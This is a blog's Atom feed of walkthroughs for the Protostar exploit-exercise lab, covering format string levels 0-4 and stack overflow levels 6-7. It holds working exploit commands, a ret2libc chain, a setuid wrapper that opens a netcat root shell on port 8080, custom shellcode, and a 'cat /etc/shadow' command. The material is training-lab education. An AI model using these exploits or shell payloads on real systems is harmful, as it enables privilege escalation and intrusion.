<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: exploits | Louis Li]]></title>
  <link href="http://louisrli.github.io/blog/categories/exploits/atom.xml" rel="self"/>
  <link href="http://louisrli.github.io/"/>
  <updated>2014-11-07T17:09:31-08:00</updated>
  <id>http://louisrli.github.io/</id>
  <author>
    <name><![CDATA[Louis Li]]></name>
    <email><![CDATA[louisrli@gmail.com]]></email>
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Protostar Format String Exploits (Solutions 0-4)]]></title>
    <link href="http://louisrli.github.io/blog/2012/08/29/protostar-format0/"/>
    <updated>2012-08-29 00:00:00 -0700</updated>
    <id>http://louisrli.github.io/blog/2012/08/29/protostar-format0</id>
    <content type="html"><![CDATA[<h1 id="overview">Overview</h1>
<p><strong>Protostar</strong> is a series of exercises from <a href="http://exploit-exercises.com/protostar">Exploit Exercises</a>. In addition to three final levels, it has four basic sections: network programming, format strings, heap overflows, and stack overflows.</p>

<p>This post contains solutions and walkthroughs for the four format string levels (“Format”).</p>

<h1 id="solutions">Solutions</h1>
<p>## Format: Level 0
<strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/format0">full</a>): Change the value of a stack variable to <code>0xdeadbeef</code> using less than 10 bytes of input.</p>

<p>This exploit shows similarities (sometimes) between format string exploits and buffer overflows.
<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> ./format0 %64s<span class="k">$(</span>perl -e ‘print “<span class="se">\x</span>ef<span class="se">\x</span>be<span class="se">\x</span>ad<span class="se">\x</span>de”’<span class="k">)</span>&lt;/p&gt;

<span class="go">&lt;p&gt;you have hit the target correctly :)</span></code></pre></div></p>

<!-- more -->
<p>## Format: Level 1
<strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/format1">full</a>): Change the value of a global variable, <code>target</code>, to any nonzero value.</p>

<p><code>target</code> is a global variable. To overwrite it, we first find its address using <code>obdjump -t</code> (we could also use <code>nm</code> to save some keystrokes).
<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> objdump -t format1 <span class="p">|</span> grep target
<span class="go">08049638 g       0 .bss    00000004            target</span></code></pre></div></p>

<p>Next, we need to find where the format function expects the first (missing) argument to the format string.
<div class="highlight"><pre><code class="language-text" data-lang="text">Starting program: /opt/protostar/bin/format1 AAAA%08x&lt;/p&gt;

&lt;p&gt;Breakpoint 1, __printf (format=0xbffff98f “AAAA%08x”) at printf.c:29
29      printf.c: No such file or directory.
in printf.c
(gdb) x/10xw $esp
0xbffff768:     0x00000002      0xb7edcf90      0xb7edcf99      0xb7fd6ff4
0xbffff778:     0xbffff798      0x08048405      0xbffff98f      0x0804960c
0xbffff788:     0xbffff7b8      0x08048469
(gdb) x/xw 0xbffff784
0xbffff784:     0x0804960c
(gdb) p 0xbffff98f - 0x0bffff784
$1 = 523</code></pre></div></p>

<p>An important detail: adding <em>n</em> characters will actually decrease the starting address of the string’s characters by <em>n</em> bytes. Adding one more character decrements the address from <code>0xbffff98f</code> to <code>0xbffff98e</code>. This leaves the location of the first parameter unchanged.</p>

<p>Remember that the offset is calculated <em>relative to the format function</em> (i.e. <code>printf</code>) rather than <code>vuln()</code>.
<div class="highlight"><pre><code class="language-text" data-lang="text">(gdb) run AAAAA%08x
The program being debugged has been started already.
Start it from the beginning? (y or n) y&lt;/p&gt;

&lt;p&gt;Starting program: /opt/protostar/bin/format1 AAAAA%08x&lt;/p&gt;

&lt;p&gt;Breakpoint 1, __printf (format=0xbffff98e “AAAAA%08x”) at printf.c:29
29      printf.c: No such file or directory.
in printf.c
(gdb) x/xw 0xbffff784
0xbffff784:     0x0804960c</code></pre></div></p>

<ul>
  <li><code>0xbffff784</code>: The first argument to the format string.</li>
  <li><code>0xbffff997 - n</code>: The first character of the format string, where <code>n</code> is the total number of characters in the string. The odd alignment is caused by the null byte.</li>
</ul>

<p>As seen earlier, the distance between the beginning of the format string (the address of <code>target</code>) and the first argument to the format string (a starting address for “stack popping” additional arguments) is about 500 bytes.</p>

<p>With a few calculations, we can find the correct offset.
<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> ./format1 <span class="k">$(</span>perl -e ‘print “<span class="se">\x</span>38<span class="se">\x</span>96<span class="se">\x</span>04<span class="se">\x</span>08”’<span class="k">)</span>’..%128<span class="nv">$n</span>’
<span class="go">8..you have modified the target :)</span></code></pre></div></p>

<h2 id="format-level-2">Format: Level 2</h2>
<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/format3">full</a>): Change the value of a global variable, <code>target</code>, to <code>0x40</code>.</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> objdump -t format2 <span class="p">|</span> grep target
<span class="go">080496e4 g     O .bss   00000004              target</span></code></pre></div></p>

<p>Using the same techniques as before, we find the beginning of the format string in memory. The fourth expected format string argument coincides with the beginning of the format string in memory. We store our target address at the beginning of the format string in order to write to it.</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">echo</span> -ne <span class="k">$(</span>perl -e ‘print “<span class="se">\x</span>e4<span class="se">\x</span>96<span class="se">\x</span>04<span class="se">\x</span>08”’<span class="k">)</span>%4<span class="nv">$08x</span> <span class="p">|</span> ./format2
<span class="go">080496e4target is 0 :(</span></code></pre></div></p>

<p>Finally, we calculate the number of bytes needed to write 64 (0x40). The address of <code>target</code> occupies four bytes first, and we need another 60 bytes.</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">echo</span> -ne <span class="k">$(</span>perl -e ‘print “<span class="se">\x</span>e4<span class="se">\x</span>96<span class="se">\x</span>04<span class="se">\x</span>08”’<span class="k">)</span>%60u%4<span class="nv">$n</span> <span class="p">|</span> ./format2
<span class="go">                                                         512you have modified the target :)</span></code></pre></div></p>

<h2 id="format-level-3">Format: Level 3</h2>
<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/format3">full</a>): Change the value of a global variable, <code>target</code>, to <code>0x01025544</code>.</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> objdump -t format3 <span class="p">|</span> grep target
<span class="go">080496f4 g     O .bss   00000004              target</span></code></pre></div></p>

<p>We calculate the offset between the format function parameters and the characters of the string in the same way as the previous exercises.
<div class="highlight"><pre><code class="language-text" data-lang="text">(gdb) break printf
Breakpoint 1 at 0x804837c
(gdb) run
Starting program: /opt/protostar/bin/format3
AAAA
Breakpoint 1, __printf (format=0xbffff5a0 “AAAA\n”) at printf.c:29
29      printf.c: No such file or directory.
in printf.c
(gdb) info frame
Stack level 0, frame at 0xbffff570:
eip = 0xb7edcfa2 in __printf (printf.c:29); saved eip 0x8048465
called by frame at 0xbffff590
source language c.
Arglist at 0xbffff568, args: format=0xbffff5a0 “AAAA\n”
Locals at 0xbffff568, Previous frame’s sp is 0xbffff570
Saved registers:
ebx at 0xbffff564, ebp at 0xbffff568, eip at 0xbffff56c
(gdb) x/3xw 0xbffff568
0xbffff568:     0xbffff588      0x08048465      0xbffff5a0
(gdb) x/w 0xbffff570
0xbffff570:     0xbffff5a0
(gdb) p 0xbffff5a0 - 0xbffff570
= 48</code></pre></div></p>

<p>We can confirm that our offset of 48 (12 * 4 bytes) is correct.
<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">echo </span>AAAA%12<span class="nv">$x</span> <span class="p">|</span> ./format3
<span class="go">AAAA41414141</span>
<span class="go">target is 00000000 :(</span></code></pre></div></p>

<p>Next, we need to change the value of target to <code>0x01025544</code>. Below is each byte in decimal:
<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">echo</span> “ibase<span class="o">=</span>16<span class="p">;</span> 44” <span class="p">|</span> bc
<span class="go">68</span>
<span class="gp">$</span> <span class="nb">echo</span> “ibase<span class="o">=</span>16<span class="p">;</span> 55” <span class="p">|</span> bc
<span class="go">85</span>
<span class="gp">$</span> <span class="nb">echo</span> “ibase<span class="o">=</span>16<span class="p">;</span> 02” <span class="p">|</span> bc
<span class="go">2</span>
<span class="gp">$</span> <span class="nb">echo</span> “ibase<span class="o">=</span>16<span class="p">;</span> 01” <span class="p">|</span> bc
<span class="go">1</span></code></pre></div></p>

<p>Finally, we write values to each of the four bytes of <code>target</code>:
<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">echo</span> <span class="k">$(</span>perl -e ‘print “<span class="se">\x</span>f4<span class="se">\x</span>96<span class="se">\x</span>04<span class="se">\x</span>08”’<span class="k">)$(</span>perl -e ‘print “<span class="se">\x</span>f5<span class="se">\x</span>96<span class="se">\x</span>04<span class="se">\x</span>08”’<span class="k">)$(</span>perl -e ‘print “<span class="se">\x</span>f6<span class="se">\x</span>96<span class="se">\x</span>04<span class="se">\x</span>08”’<span class="k">)$(</span>perl -e ‘print “<span class="se">\x</span>f7<span class="se">\x</span>96<span class="se">\x</span>04<span class="se">\x</span>08”’<span class="k">)</span>’%52u%12<span class="nv">$n</span>%’‘17u%13<span class="nv">$n</span>’‘%173u%14<span class="nv">$n</span>’ <span class="p">|</span> ./format3
<span class="go">���                                                   0       3221222848                                                                                                                                                                   3086839796</span>
<span class="go">you have modified the target :))</span></code></pre></div></p>

<p>Note that it wasn’t necessary to include the last address, <code>0x080496f7</code>, since the most significant byte (<code>0x01</code>) is written as a consequence of the overflow.</p>

<h2 id="format-level-4">Format: Level 4</h2>
<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/format4">full</a>): Redirect execution flow to <code>hello()</code> by using a format string exploit.</p>

<p>In this exercise, the offset is only 16 bytes (four parameter arguments). The calculation is omitted as the two previous exercises illustrate the process.
<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">echo</span> ‘AAAA%4<span class="nv">$x</span>’ <span class="p">|</span> ./format4
<span class="go">AAAA41414141</span></code></pre></div></p>

<p>In order to perform this exploit, we’ll <a href="http://www.stanford.edu/~stinson/cs155/rdg/rdg_list.txt">overwrite an entry in global offset table</a>. Specifically, we’ll overwrite the entry of the <code>exit()</code> function (<code>0x08049724</code>) with the address of the <code>hello()</code> function (<code>0x08048b4</code>).
<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> objdump -TR format4 <span class="p">|</span> grep <span class="nb">exit</span>
<span class="go">00000000      DF &lt;em&gt;UND&lt;/em&gt; 00000000  GLIBC_2.0   _exit</span>
<span class="go">00000000      DF &lt;em&gt;UND&lt;/em&gt;  00000000  GLIBC_2.0   exit</span>
<span class="go">08049718 R_386_JUMP_SLOT   _exit</span>
<span class="go">08049724 R_386_JUMP_SLOT   exit</span>
<span class="gp">$</span> objdump -t format4 <span class="p">|</span> grep hello
<span class="go">080484b4 g     F .text  0000001e              hello</span></code></pre></div></p>

<p>To confirm that our overwrite works correctly, we run a quick test:
<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">echo</span> <span class="k">$(</span>perl -e ‘print “<span class="se">\x</span>24<span class="se">\x</span>97<span class="se">\x</span>04<span class="se">\x</span>08”’<span class="k">)</span>’%4<span class="nv">$n</span>’ <span class="p">&amp;</span>gt<span class="p">;</span> /tmp/format4
<span class="gp">$</span> gdb -q format4
<span class="go">Reading symbols from /opt/protostar/bin/format4…done.</span>
<span class="go">(gdb) run &amp;lt; /tmp/format4</span>
<span class="go">Starting program: /opt/protostar/bin/format4 &amp;lt; /tmp/format4</span>
<span class="gp">$</span>�
<span class="go">Program received signal SIGSEGV, Segmentation fault.</span>
<span class="go">0x00000004 in ?? ()</span></code></pre></div></p>

<p>Execution jumped to the address <code>0x00000004</code>, meaning that we’re on the right track. Finally, we use a <strong>short write</strong> (<code>%hn</code>, allowing us to write to two bytes) to overwrite the last two bytes of the GOT entry. This works because both addresses start with <code>0x0804</code> – only the last two bytes need to be changed.
<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">echo</span> <span class="k">$(</span>perl -e ‘print “<span class="se">\x</span>24<span class="se">\x</span>97<span class="se">\x</span>04<span class="se">\x</span>08”’<span class="k">)</span>’%33968u%4<span class="nv">$hn</span>’ <span class="p">|</span> ./format4
<span class="gp">$</span>
<span class="go">&lt;lots of=&quot;&quot; whitespace=&quot;&quot;&gt;</span>
<span class="go">512</span>
<span class="go">                                                                                                                                                                              code execution redirected! you win</span></code></pre></div></lots></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Protostar Stack Exploits (Solutions 6-7)]]></title>
    <link href="http://louisrli.github.io/blog/2012/08/28/protostar-stack2/"/>
    <updated>2012-08-28 00:00:00 -0700</updated>
    <id>http://louisrli.github.io/blog/2012/08/28/protostar-stack2</id>
    <content type="html"><![CDATA[<h1 id="overview">Overview</h1>
<p><strong>Protostar</strong> is a series of exercises from <a href="http://exploit-exercises.com/protostar">Exploit Exercises</a>. In addition to three final levels, it has four basic sections: network programming, format strings, heap overflows, and stack overflows.</p>

<p>This series of posts contains solutions and walkthroughs for the stack overflow levels (“Stack”). It assumes basic knowledge of systems programming and is meant to serve as a reference for those stuck on certain levels. This is the final post for Stack.</p>

<h1 id="solutions">Solutions</h1>
<p>## Stack 6
<strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack6">full</a>): Execute shellcode with a restriction on the return address. This mimics a nonexecutable stack by barring any return addresses of the form <code>0xbfxxxxxx</code>.</p>

<h3 id="utilities">Utilities</h3>
<p>We’ll add one more script to our utility belt. This will help us quickly make guesses for buffer overflows.</p>

<p><code>~/try-address.sh</code>:
<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c">#!/bin/bash</span>
<span class="c"># Takes an offset and unlimited 4-byte addresses and prints it in little-endian order</span>
<span class="k">if</span> <span class="o">[[</span> <span class="nv">$# </span>-lt <span class="m">2</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
    <span class="nb">echo</span> “usage: <span class="nv">$0</span> OFFSET ADDRESS. Example: <span class="nv">$0</span> <span class="m">80</span> 0xdeadbeef 0xf00f00f0”
    <span class="nb">exit </span>1
<span class="k">fi</span>&lt;/p&gt;

&lt;p&gt;perl -e “print ‘A’x<span class="nv">$1</span>”
<span class="nb">shift</span>
<span class="k">for</span> addr in <span class="nv">$@</span><span class="p">;</span> <span class="k">do</span>
    <span class="k">for</span> i in <span class="k">$(</span>seq <span class="m">8</span> -2 2<span class="k">)</span><span class="p">;</span> <span class="k">do</span> <span class="nb">echo</span> -ne “<span class="se">\x</span><span class="k">${</span><span class="nv">addr</span><span class="p">:</span><span class="nv">$i</span><span class="p">:</span><span class="nv">2</span><span class="k">}</span>”<span class="p">;</span> <span class="k">done</span>
<span class="k">done</span></code></pre></div></p>

<!-- more -->
<p>### Solution
First, we need to find the proper offset for overwriting the return address. The command below reveals that the return address is 16 bytes after the end of the 64 byte buffer, meaning that 80 bytes are needed before overwriting the return address.</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="k">for</span> i in <span class="k">$(</span>seq <span class="m">76</span> <span class="m">4</span> 100<span class="k">)</span><span class="p">;</span> <span class="k">do</span> <span class="nb">echo</span> <span class="nv">$i</span><span class="p">;</span> ~/try-address.sh <span class="nv">$i</span> 0xbfffffff <span class="p">|</span> ./stack6<span class="p">;</span> <span class="k">done</span>
<span class="go">76</span>
<span class="go">…</span>
<span class="go">80</span>
<span class="go">input path please: bzzzt (0xbfffffff)</span>
<span class="go">84</span>
<span class="go">…</span></code></pre></div></p>

<p>For our solution, we’ll be performing a <strong><a href="http://en.wikipedia.org/wiki/Return-to-libc_attack">ret2libc</a></strong> attack. <a href="http://shellblade.net/docs/ret2libc.pdf">This paper</a> by InVoLuNTaRy offers an in-depth description of the tactic (sidenote: it’s one of the most well-written papers that I’ve ever read and well worth the read). The rest of this section assumes that this paper has been read.</p>

<p>First, we find the addresses of the <code>system()</code> and <code>exit()</code> libc functions. <code>exit()</code> isn’t strictly necessary, but since ret2libc ultimately calls two functions, we prefer to return without a segmentation fault.
<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> gdb -q stack6
<span class="go">Reading symbols from /opt/protostar/bin/stack6…done.</span>
<span class="go">(gdb) break main</span>
<span class="go">Breakpoint 1 at 0x8048500: file stack6/stack6.c, line 27.</span>
<span class="go">(gdb) run</span>
<span class="go">Starting program: /opt/protostar/bin/stack6&lt;/p&gt;</span>

<span class="go">&lt;p&gt;Breakpoint 1, main (argc=1, argv=0xbffff874) at stack6/stack6.c:27</span>
<span class="go">27      stack6/stack6.c: No such file or directory.</span>
<span class="go">in stack6/stack6.c</span>
<span class="go">(gdb) print system</span>
<span class="gp">$</span><span class="nv">1</span> <span class="o">=</span> <span class="o">{</span><span class="p">&amp;</span>lt<span class="p">;</span>text variable, no debug info<span class="p">&amp;</span>gt<span class="p">;</span><span class="o">}</span> 0xb7ecefb0 &lt;__libc_system&gt;
<span class="go">(gdb) print exit</span>
<span class="gp">$</span><span class="nv">2</span> <span class="o">=</span> <span class="o">{</span><span class="p">&amp;</span>lt<span class="p">;</span>text variable, no debug info<span class="p">&amp;</span>gt<span class="p">;</span><span class="o">}</span> 0xb7ec50c0 <span class="p">&amp;</span>lt<span class="p">;</span>*__GI_exit<span class="p">&amp;</span>gt<span class="p">;</span></code></pre></div></__libc_system></p>

<p>We see that our functions have the following addresses:</p>

<ul>
  <li><code>system()</code>: <code>0xb7ecefb0</code></li>
  <li><code>exit()</code>: <code>0xb7ec50c0</code></li>
</ul>

<p>Given the particular stack layout for a ret2libc attack (described in the InVoLuNTaRy paper), our solution will be of the form:
<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> ~/try-address.sh <span class="m">80</span> <span class="o">(</span>ENV_VAR_ADDRESS<span class="o">)</span> <span class="o">(</span>EXIT<span class="o">()</span>_ADDRESS<span class="o">)</span> <span class="o">(</span>SYSTEM<span class="o">()</span>_ADDRESS<span class="o">)</span></code></pre></div></p>

<h4 id="sanity-checks">Sanity checks</h4>
<p>First, let’s make sure that we can actually execute code.
<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">export </span><span class="nv">TEST</span><span class="o">=</span>whoami
<span class="gp">$</span> /home/user/try-address.sh <span class="m">80</span> 0xb7ecefb0 0xb7ec50c0 0xbfffff8a <span class="p">|</span> ./stack6
<span class="go">input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��AAAAAAAAAAAA���P췊���</span>
<span class="go">sh: =whoami: not found</span>
<span class="gp">$</span> /home/user/try-address.sh <span class="m">80</span> 0xb7ecefb0 0xb7ec50c0 0xbfffff8b <span class="p">|</span> ./stack6
<span class="go">input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��AAAAAAAAAAAA���P췋���</span>
<span class="go">root</span></code></pre></div></p>

<h4 id="working-netcat-solution">Working netcat solution</h4>
<p>There are two obstacles to a working solution.</p>

<ol>
  <li>Environmental variables with spaces don’t work. All of the following would fail:
<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">export </span><span class="nv">RUN</span><span class="o">=</span>”nc -lp8080 -e/bin/sh”
<span class="gp">$</span> <span class="nb">export </span><span class="nv">RUN</span><span class="o">=</span>”cat /etc/shadow”
<span class="gp">$</span> <span class="nb">export </span><span class="nv">RUN</span><span class="o">=</span>”<span class="s2">&quot;cat /etc/shadow&quot;</span>”</code></pre></div></li>
  <li><code>system()</code> will drop our root privileges (<a href="http://linux.die.net/man/3/system">man system</a>)</li>
</ol>

<p>Instead, we can wrap our call to netcat in another C program, naming an executable without spaces and restoring our privileges.</p>

<p><div class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#include &lt;stdlib.h&gt;&lt;/stdlib.h&gt;&lt;/p&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="c1">// These two are necessary, as system() drops privileges</span>
    <span class="n">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">args</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>  <span class="err">“</span><span class="n">nc</span><span class="err">”</span><span class="p">,</span> <span class="err">“</span><span class="o">-</span><span class="n">lp8080</span><span class="err">”</span><span class="p">,</span> <span class="err">“</span><span class="o">-</span><span class="n">e</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span><span class="err">”</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="mi">0</span> <span class="p">};</span>
    <span class="n">execve</span><span class="p">(</span><span class="err">“</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">nc</span><span class="err">”</span><span class="p">,</span> <span class="n">args</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
<span class="p">}</span></code></pre></div></p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> gcc ~/netcat.c -o ~/netcat
<span class="gp">$</span> <span class="nb">export </span><span class="nv">RUN</span><span class="o">=</span>/////////////////////////////////////home/user/netcat   <span class="c"># The slashes are similar to a NOP sled</span>
<span class="gp">$</span> ~/envaddr RUN
<span class="go">RUN is at address 0xbfffff9e</span>
<span class="gp">$</span> /home/user/try-address.sh <span class="m">80</span> 0xb7ecefb0 0xb7ec50c0 0xbfffff9e <span class="p">|</span> ./stack6
<span class="go">input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��AAAAAAAAAAAA���P췞���</span>
<span class="go">sh: 192.168.1.10: not found</span></code></pre></div></p>

<p><code>system()</code> doesn’t seem to be using the contents of our environmental variable. If we look at the environmental variables, though, we see that we were close enough: <code>RUN</code> is the next variable. We then adjust our estimate for the address of <code>RUN</code> by 20 bytes.</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> env
<span class="go">…</span>
<span class="go">HOME=/home/user</span>
<span class="go">LOGNAME=user</span>
<span class="go">SSH_CONNECTION=192.168.1.7 49324 192.168.1.10 22</span>
<span class="go">RUN=/////////////////////////////////////home/user/netcat</span>
<span class="go">_=/usr/bin/env</span>
<span class="gp">$</span> /home/user/try-address.sh <span class="m">80</span> 0xb7ecefb0 0xb7ec50c0 0xbfffffbe <span class="p">|</span> ./stack6
<span class="go">input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��AAAAAAAAAAAA���P췳���&lt;/p&gt;</span>
<span class="go">&lt;waiting&gt;</span></code></pre></div>

Finally, through a remote machine:
<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="o">[</span>louis@neutrino ~<span class="o">]</span><span class="nv">$ </span>nc 192.168.1.10 8080
<span class="go">whoami</span>
<span class="go">root</span></code></pre></div>

## Stack: Level 7
**Description** ([full](http://exploit-exercises.com/protostar/stack7)): Execute shellcode with further restrictions on the return address. Any address of the form `0xbxxxxxxx` raises an error.

### Overview

The return value of a function is usually stored in the `eax` register. The key to this level is the call to `return strdup(buf)`: this means we can find the buffer (e.g. our shellcode) in the `eax` register when `getpath()` returns.

The code restricts us from returning to any code on the bottom of the stack (`0xbxxxxxxx`) and advises us to return to the `.text` section. In particular, we&#8217;ll want to return to a `call eax` instruction, which will then call our shellcode.

<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> objdump -M intel -d stack7 <span class="p">|</span> grep <span class="s2">&quot;call.*eax&quot;</span>
<span class="go">8048478:       ff 14 85 5c 96 04 08    call   DWORD PTR [eax*4+0x804965c]</span>
<span class="go">80484bf:       ff d0                   call   eax</span>
<span class="go">80485eb:       ff d0                   call   eax</span></code></pre></div>

If we play with the numbers like in earlier levels, we&#8217;ll find that 80 bytes are needed before the return address. Our buffer overflow will look like this:
<div class="highlight"><pre><code class="language-text" data-lang="text">Buffer start
      | ---------- Shellcode (n bytes) --------- |
      | -------- Padding (80 - n bytes) -------- |
      | -- Return address 0x80484bf (4 bytes) -- |
Buffer end (84 bytes total)</code></pre></div>

### Solution
In earlier levels, we found that opening a shell with `gets()`. However, we can still use it to validate our strategy:
<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">echo</span> -ne <span class="k">$(</span>cat ~/shell<span class="k">)$(</span>~/try-address.sh <span class="m">49</span> 0x080484bf<span class="k">)</span> <span class="p">|</span> wc -c
<span class="go">84</span>
<span class="gp">$</span> <span class="nb">echo</span> -ne <span class="k">$(</span>cat ~/shell<span class="k">)$(</span>~/try-address.sh <span class="m">49</span> 0x080484bf<span class="k">)</span> <span class="p">&amp;</span>gt<span class="p">;</span> /tmp/stack7shell
<span class="gp">$</span> gdb -q stack7
<span class="go">Reading symbols from /opt/protostar/bin/stack7...done.</span>
<span class="go">(gdb) run &amp;lt; /tmp/stack7shell</span>
<span class="go">Starting program: /opt/protostar/bin/stack7 &amp;lt; /tmp/stack7shell</span>
<span class="go">input path please: got path ����1�Ph//shh/bin��h-ilsP�̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAA�AAAAAAAAAAAA��</span>
<span class="go">Executing new program: /bin/dash</span>

<span class="go">Program exited normally.</span></code></pre></div>

If we give it a shot with our `nc` shellcode, we&#8217;ll find the following error: `bin/sh: forward host lookup failed: Unknown host`. This occurs as a complication from having options passed into the `execve` call.

We can add another wrapper to the `netcat.c` used in Level 6 by writing our own shellcode. This shellcode will simply execute `/tmp/nc`, an alias for a compiled `netcat.c`. This file, in turn, calls netcat and listens via port 8080.

`~/sc-tmp-nc.asm`:
<div class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="k">BITS</span> <span class="mi">32</span>

<span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
<span class="nf">push</span> <span class="nb">eax</span>
<span class="nf">push</span> <span class="mh">0x636e2f2f</span>         <span class="c1">; //nc</span>
<span class="nf">push</span> <span class="mh">0x706d742f</span>         <span class="c1">; /tmp</span>
<span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">esp</span>
<span class="nf">push</span> <span class="nb">eax</span>
<span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">esp</span>
<span class="nf">push</span> <span class="nb">ebx</span>
<span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esp</span>
<span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mi">11</span>              <span class="c1">; execve()</span>
<span class="nf">int</span> <span class="mh">0x80</span></code></pre></div>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> nasm ~/sc-tmp-nc.asm
<span class="gp">$</span> gcc ~/netcat.c -o ~/netcat
<span class="gp">$</span> cp /home/user/netcat /tmp/nc
<span class="gp">$</span> cat /home/user/sc-tmp-nc <span class="p">|</span> wc -c
<span class="go">25</span>
<span class="go">got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��</span>
<span class="gp">$</span> <span class="nb">echo</span> -ne <span class="k">$(</span>cat ~/sc-tmp-nc<span class="k">)$(</span>~/try-address.sh <span class="m">55</span> 0x080484bf<span class="k">)</span> <span class="p">|</span> ./stack7
<span class="go">input path please: got path 1�Ph//nch/tmp���̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�AAAAAAAAAAAA��</span>
<span class="go">&lt;waiting&gt;</span></code></pre></div>

On a remote machine:
<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="o">[</span>louis@neutrino ~<span class="o">]</span><span class="nv">$ </span>nc 192.168.1.10 8080
<span class="go">whoami</span>
<span class="go">root</span></code></pre></div>
</waiting></waiting>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Protostar Stack Exploits (Solutions 4-5)]]></title>
    <link href="http://louisrli.github.io/blog/2012/08/24/protostar-stack1/"/>
    <updated>2012-08-24 00:00:00 -0700</updated>
    <id>http://louisrli.github.io/blog/2012/08/24/protostar-stack1</id>
    <content type="html"><![CDATA[<h1 id="overview">Overview</h1>
<p><strong>Protostar</strong> is a series of exercises from <a href="http://exploit-exercises.com/protostar">Exploit Exercises</a>. In addition to three final levels, it has four basic sections: network programming, format strings, heap overflows, and stack overflows.</p>

<p>This series of posts contains solutions and walkthroughs for the stack overflow levels (“Stack”). It assumes basic knowledge of systems programming and is meant to serve as a reference for those stuck on certain levels. This is the second of three posts for Stack.</p>

<h1 id="solutions">Solutions</h1>
<p>## Stack: Level 4
<strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack4">full</a>): Overwrite the <a href="http://en.wikibooks.org/wiki/X86_Assembly/X86_Architecture#Instruction_Pointer">eip register</a> to change execution flow.</p>

<p>First, we want to find the offset to the return address. We can explore using gdb and a breakpoint on <code>main</code>.</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> gdb ./stack4</code></pre></div></p>

<!-- more -->
